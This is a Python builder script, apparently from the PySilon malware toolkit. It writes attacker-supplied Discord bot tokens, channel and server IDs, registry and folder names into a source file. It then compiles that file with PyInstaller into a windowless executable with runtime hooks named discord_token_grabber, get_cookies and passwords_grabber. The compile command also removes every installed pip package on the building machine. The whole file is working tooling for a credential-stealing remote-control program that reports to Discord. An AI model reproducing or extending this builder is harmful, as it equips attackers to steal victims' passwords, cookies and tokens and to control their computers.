import configparser
import hashlib
import sys
import os

def get_file_hash(path):
    sha256_hash = hashlib.sha256()
    with open(path,"rb") as f:
        for byte_block in iter(lambda: f.read(16777216),b""):
            sha256_hash.update(byte_block)
        return sha256_hash.hexdigest()

def compile():
    config = configparser.ConfigParser()
    if 'configuration.ini' in os.listdir('.'): config.read('configuration.ini')
    else: input('Configuration file not found! Press ENTER to terminate...'); sys.exit(0)

    if len(config['SETTINGS']) != 12 or len(config['FUNCTIONALITY']) != 13:
        return 'Config corrupted'

    compiling_command = 'start cmd /k "title Reorganising packages... & pip freeze > to_uninstall.txt & pip uninstall -y -r to_uninstall.txt > nul & del to_uninstall.txt > nul & pip install pillow > nul & pip install pyinstaller > nul & pip install -r custom_imports.txt > nul & title Compiling source code... & pyinstaller -F --noconsole --add-data "resources/libopus-0.x64.dll;." --runtime-hook=resources/misc.py --runtime-hook=resources/discord_token_grabber.py --runtime-hook=resources/get_cookies.py --runtime-hook=resources/passwords_grabber.py --icon "' + config['SETTINGS']['icon_path'] + '" "source_prepared.py" > nul & echo - & echo.Done & echo.- & start dist & del source_prepared.spec > nul & rmdir build /S /Q & pause & exit"'

    with open('PySilon.key', 'wb') as save_key: save_key.write(os.urandom(1024*1024))
    with open('source_assembled.py', 'r', encoding='utf-8') as copy_source_code: source_code = copy_source_code.readlines()
    with open('source_prepared.py', 'w', encoding='utf-8') as edit_source_code:
        for line in source_code:
            if line.startswith('bot_tokens'): edit_source_code.write('bot_tokens = [\'' + config['SETTINGS']['bot_token_1'] + (('\', \'' + config['SETTINGS']['bot_token_2']) if config['SETTINGS']['bot_token_2'] != '' else '') + (('\', \'' + config['SETTINGS']['bot_token_3']) if config['SETTINGS']['bot_token_3'] != '' else '') + '\']\n')
            elif line.startswith('software_registry_name'): edit_source_code.write('software_registry_name = \'' + config['SETTINGS']['registry_name'] + '\'\n')
            elif line.startswith('software_directory_name'): edit_source_code.write('software_directory_name = \'' + config['SETTINGS']['directory_name'] + '\'\n')
            elif line.startswith('software_executable_name'): edit_source_code.write('software_executable_name = \'' + config['SETTINGS']['executable_name'] + '\'\n')
            elif line.startswith('    \'info\':'): edit_source_code.write('    \'info\': True,\n')
            elif line.startswith('    \'main\':'): edit_source_code.write('    \'main\': True,\n')
            elif line.startswith('    \'spam\':'): edit_source_code.write('    \'spam\': ' + config['SETTINGS']['spam_channel'] + ',\n')
            elif line.startswith('    \'file\':'): edit_source_code.write('    \'file\': ' + config['SETTINGS']['file-related_channel'] + ',\n')
            elif line.startswith('    \'recordings\':'): edit_source_code.write('    \'recordings\': ' + config['SETTINGS']['recordings_channel'] + ',\n')
            elif line.startswith('    \'voice\':'): edit_source_code.write('    \'voice\': ' + config['SETTINGS']['voice_channel'] + '\n')
            elif line.startswith('secret_key'): edit_source_code.write('secret_key = \'' + get_file_hash('PySilon.key') + '\'\n')
            elif line.startswith('guild_id'): edit_source_code.write('guild_id = ' +config['SETTINGS']['server_id']+ '\n')
            elif line.startswith('#') or line.replace(' ', '') == '\n': pass
            else: edit_source_code.write(line)

    os.system(compiling_command)
